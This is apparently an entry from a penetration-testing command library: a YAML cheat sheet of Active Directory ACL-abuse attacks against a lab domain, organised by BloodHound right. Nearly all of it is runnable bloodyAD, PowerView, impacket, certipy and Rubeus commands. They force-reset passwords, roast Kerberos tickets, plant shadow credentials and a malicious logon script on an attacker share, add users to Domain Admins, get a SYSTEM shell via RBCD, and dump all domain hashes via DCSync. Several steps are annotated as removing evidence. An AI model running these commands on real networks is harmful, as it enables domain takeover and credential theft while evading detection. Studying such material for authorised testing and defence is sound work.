---
description: |
  Active Directory ACL abuse — every BloodHound-reported right, organized by scenario (right + target object type).
  Each scenario groups bloodyAD (remote/Linux) and PowerView (Windows shell) commands together.
  PowerView: always build $Cred when the abusing user differs from your current shell identity.
commands:
  - have: Credentials
    cmd: |
      # ── $Cred setup — build this first when running PowerView as a different user than your shell ──
      Import-Module .\PowerView.ps1
      $SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
      $Cred = New-Object System.Management.Automation.PSCredential('senshu.local\sec_user', $SecPassword)

      # ── ENUMERATION ──────────────────────────────────────────────────────────────────────

      # list every AD object your current user has write permissions over
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get writable --detail

      # show current members of a group
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get groupMember "Domain Admins"

      # find ACEs across the domain where sec_user is the trustee — resolve GUIDs to human-readable names
      Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "sec_user"}

      # ════════════════════════════════════════════════════════════════
      # [USER] ForceChangePassword / GenericAll — reset password
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: force-set target's password without knowing the current one
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set password targetuser 'NewP@ssw0rd!'

      # rpcclient: same via MS-SAMR — info level 23 = set password
      rpcclient -U 'sec_user%P@ssw0rd' 10.10.10.27 -W senshu.local -c 'setuserinfo2 targetuser 23 NewP@ssw0rd!'

      # net rpc: same over RPC, useful when rpcclient is unavailable
      net rpc password "targetuser" "NewP@ssw0rd!" -U 'senshu.local/sec_user%P@ssw0rd' -S 10.10.10.27

      # PowerView: convert new password to SecureString then push it to the target account
      $pass = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
      Set-DomainUserPassword -Identity targetuser -AccountPassword $pass -Credential $Cred

      # ════════════════════════════════════════════════════════════════
      # [USER] GenericWrite — targeted Kerberoasting (set SPN → ticket → clean up)
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: write a fake SPN on the target so it becomes Kerberoastable
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName -v 'nonexistent/BLAHBLAH'

      # request TGS ticket for the fake SPN and save for offline cracking
      impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile targeted.kerberoast

      # bloodyAD: remove the SPN after obtaining the hash (clean up IOC)
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName

      # crack the TGS hash offline against a wordlist
      hashcat -m 13100 targeted.kerberoast /usr/share/wordlists/rockyou.txt

      # PowerView: set fake SPN on target using explicit $Cred (as a different user)
      Set-DomainObject -Credential $Cred -Identity targetuser -Server DC01.senshu.local -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

      # PowerView: request the TGS ticket for the fake SPN
      Get-DomainSPNTicket -Credential $Cred -SPN "nonexistent/BLAHBLAH" | fl

      # PowerView: clear the SPN to remove evidence after cracking
      Set-DomainObject -Credential $Cred -Identity targetuser -Clear serviceprincipalname

      # ════════════════════════════════════════════════════════════════
      # [USER] GenericWrite — AS-REP Roasting (enable DONT_REQ_PREAUTH)
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: disable Kerberos pre-auth on target — account now emits a crackable AS-REP
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add uac targetuser -f DONT_REQ_PREAUTH

      # request AS-REP hash for accounts without pre-auth (no creds needed)
      impacket-GetNPUsers senshu.local/ -usersfile users.txt -dc-ip 10.10.10.27 -no-pass -request

      # bloodyAD: re-enable pre-auth to clean up
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 remove uac targetuser -f DONT_REQ_PREAUTH

      # PowerView: toggle DONT_REQ_PREAUTH bit via XOR on userAccountControl (4194304 = 0x400000)
      Set-DomainObject -Credential $Cred -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose

      # PowerView: verify which accounts now have pre-auth disabled
      Get-DomainUser -PreauthNotRequired -Verbose

      # ════════════════════════════════════════════════════════════════
      # [USER] GenericWrite / AddKeyCredentialLink — Shadow Credentials
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: add a key credential to target's msDS-KeyCredentialLink — allows PKINIT auth as that user
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add shadowCredentials targetuser

      # certipy: full auto — add key credential, request TGT, retrieve NT hash
      certipy shadow auto -target DC01.senshu.local -u sec_user@senshu.local -p 'P@ssw0rd' -account targetuser

      # certipy: authenticate with the generated PFX to get a TGT and NT hash
      certipy auth -pfx targetuser.pfx -dc-ip 10.10.10.27

      # ════════════════════════════════════════════════════════════════
      # [USER] GenericWrite — Logon Script (executes on next login)
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: set target's scriptPath attribute to a UNC path — script runs as the user on next logon
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser scriptpath -v '\\10.10.10.21\share\malicious.bat'

      # ════════════════════════════════════════════════════════════════
      # [USER] GenericWrite — enable disabled account
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: clear the ACCOUNTDISABLE flag so the account can authenticate again
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 remove uac targetuser -f ACCOUNTDISABLE

      # PowerView: toggle the disabled bit (bit 1 = 0x2) via XOR on userAccountControl
      Set-DomainObject -Credential $Cred -Identity targetuser -XOR @{useraccountcontrol=2} -Verbose

      # ════════════════════════════════════════════════════════════════
      # [USER] WriteOwner — take ownership → WriteDACL → GenericAll → reset password
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: set sec_user as the owner of targetuser — grants implicit WriteDACL
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set owner targetuser sec_user

      # bloodyAD: use new ownership to grant sec_user full control (GenericAll) on target
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add genericAll targetuser sec_user

      # bloodyAD: now reset the password using the GenericAll right
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set password targetuser 'NewP@ssw0rd!'

      # PowerView: take ownership of targetuser object
      Set-DomainObjectOwner -Credential $Cred -Identity targetuser -OwnerIdentity sec_user

      # PowerView: as new owner, grant yourself GenericAll (full control) on the object
      Add-DomainObjectAcl -Credential $Cred -TargetIdentity targetuser -PrincipalIdentity sec_user -Rights All

      # PowerView: use GenericAll to reset the target's password
      $pass = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
      Set-DomainUserPassword -Identity targetuser -AccountPassword $pass -Credential $Cred

      # ════════════════════════════════════════════════════════════════
      # [USER] WriteDACL — grant GenericAll on user
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: abuse WriteDACL to add a GenericAll ACE for sec_user on the target
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add genericAll targetuser sec_user

      # PowerView: write a GenericAll ACE onto target — after this you control the object
      Add-DomainObjectAcl -Credential $Cred -TargetIdentity targetuser -PrincipalIdentity sec_user -Rights All

      # impacket dacledit: low-level DACL write — grants FullControl directly in the ACL
      impacket-dacledit senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -target targetuser -action write -rights FullControl

      # ════════════════════════════════════════════════════════════════
      # [GROUP] GenericAll / GenericWrite / WriteProperty(member) / Self — add member
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: add sec_user to the target group
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add groupMember "Domain Admins" sec_user

      # net rpc: add member to group remotely from Linux (no PowerShell needed)
      net rpc group addmem "Domain Admins" sec_user -U 'senshu.local/sec_user%P@ssw0rd' -S 10.10.10.27

      # PowerView: add sec_user into the group using explicit credentials
      Add-DomainGroupMember -Identity 'Domain Admins' -Members 'sec_user' -Credential $Cred

      # ════════════════════════════════════════════════════════════════
      # [GROUP] WriteOwner — take ownership → grant GenericAll → add member
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: become owner of the group object
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set owner "Domain Admins" sec_user

      # bloodyAD: use ownership to write GenericAll ACE on the group
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add genericAll "Domain Admins" sec_user

      # bloodyAD: add yourself to the group now that you have GenericAll
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add groupMember "Domain Admins" sec_user

      # PowerView: take ownership of the group object
      Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity sec_user

      # PowerView: grant GenericAll on the group using your new ownership
      Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -PrincipalIdentity sec_user -Rights All

      # PowerView: add yourself to the group
      Add-DomainGroupMember -Identity 'Domain Admins' -Members 'sec_user' -Credential $Cred

      # ════════════════════════════════════════════════════════════════
      # [COMPUTER] GenericAll / GenericWrite — RBCD
      # Impersonate any user to the target computer via S4U2Self + S4U2Proxy
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: check how many machine accounts normal users can create (default 10)
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get object 'DC=senshu,DC=sh' --attr ms-DS-MachineAccountQuota

      # bloodyAD: create an attacker-controlled machine account to delegate from
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add computer FAKE01 'FakePass123!'

      # bloodyAD: write FAKE01$ into TARGET$'s msDS-AllowedToActOnBehalfOfOtherIdentity — enables RBCD
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add rbcd 'TARGET$' 'FAKE01$'

      # impacket: perform S4U2Self + S4U2Proxy as FAKE01$ to get a service ticket impersonating Administrator
      impacket-getST senshu.local/'FAKE01$':'FakePass123!' -spn cifs/TARGET.senshu.local -impersonate Administrator -dc-ip 10.10.10.27

      # load the impersonation ticket into the environment
      export KRB5CCNAME=Administrator.ccache

      # use the ticket to get a SYSTEM shell on the target
      impacket-psexec senshu.local/Administrator@TARGET.senshu.local -k -no-pass

      # Powermad: create attacker machine account from Windows without admin rights
      Import-Module .\Powermad.ps1
      New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force) -Verbose

      # PowerView: get the SID of the new machine account to build the security descriptor
      $ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid

      # build a raw security descriptor granting FAKE01$ full delegation rights
      $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
      $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)

      # PowerView: write the descriptor into TARGET$'s msDS-AllowedToActOnBehalfOfOtherIdentity
      Get-DomainComputer TARGET$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

      # Rubeus: S4U2Self + S4U2Proxy — inject the resulting ticket directly into the current session
      .\Rubeus.exe s4u /user:FAKE01$ /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.senshu.local /ptt

      # ════════════════════════════════════════════════════════════════
      # [COMPUTER] GenericAll / GenericWrite / AddKeyCredentialLink — Shadow Credentials
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: add a key credential on the computer object — enables PKINIT auth as the machine account
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add shadowCredentials 'TARGET$'

      # certipy: auto mode — add key, get TGT for machine account, retrieve its NT hash
      certipy shadow auto -target DC01.senshu.local -u sec_user@senshu.local -p 'P@ssw0rd' -account 'TARGET$'

      # certipy: authenticate with the machine cert to get the NT hash — usable for S4U or PtH
      certipy auth -pfx TARGET.pfx -dc-ip 10.10.10.27

      # ════════════════════════════════════════════════════════════════
      # [COMPUTER] GenericAll — read LAPS local admin password
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: search all computers with a LAPS password set and read them
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get search \
        --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

      # nxc: read LAPS passwords from LDAP for all computers you have access to
      nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' -M laps

      # PowerView: read the LAPS password for a specific computer
      Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd

      # ════════════════════════════════════════════════════════════════
      # [DOMAIN] WriteDACL / GenericAll — grant DCSync rights → dump all hashes
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: add DS-Replication-Get-Changes(-All) extended rights to sec_user on the domain object
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add dcsync sec_user

      # PowerView: grant the two DS-Replication extended rights required for DCSync
      Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=senshu,DC=local" -PrincipalIdentity sec_user -Rights DCSync -Verbose

      # secretsdump: replicate all hashes from the DC using the newly granted DCSync rights
      impacket-secretsdump senshu.local/sec_user:'P@ssw0rd'@10.10.10.27

      # ════════════════════════════════════════════════════════════════
      # [DOMAIN] WriteOwner — take ownership → WriteDACL → DCSync
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: become owner of the domain object — unlocks WriteDACL on it
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set owner 'DC=senshu,DC=sh' sec_user

      # bloodyAD: use WriteDACL (via ownership) to grant DCSync replication rights
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add dcsync sec_user

      # dump all domain hashes now that DCSync rights are in place
      impacket-secretsdump senshu.local/sec_user:'P@ssw0rd'@10.10.10.27

      # PowerView: take ownership of the domain NC root object
      Set-DomainObjectOwner -Credential $Cred -Identity "DC=senshu,DC=local" -OwnerIdentity sec_user

      # PowerView: as owner, write DCSync replication rights onto the domain object
      Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=senshu,DC=local" -PrincipalIdentity sec_user -Rights DCSync -Verbose

      # dump all hashes
      impacket-secretsdump senshu.local/sec_user:'P@ssw0rd'@10.10.10.27

      # ════════════════════════════════════════════════════════════════
      # [gMSA] GenericAll — read Group Managed Service Account password
      # ════════════════════════════════════════════════════════════════

      # bloodyAD: read the msDS-ManagedPassword blob — contains the current and previous NTLM hash
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get object 'gmsa_account$' --attr msDS-ManagedPassword

      # nxc: enumerate and decode all readable gMSA passwords in the domain
      nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' --gmsa
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - LDAP
techniques:
  - ACL_Abuse
references:
  - https://github.com/CravateRouge/bloodyAD
  - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
  - https://github.com/fortra/impacket
  - https://happycamper84.medium.com/dangerous-rights-cheatsheet-33e002660c1d
---
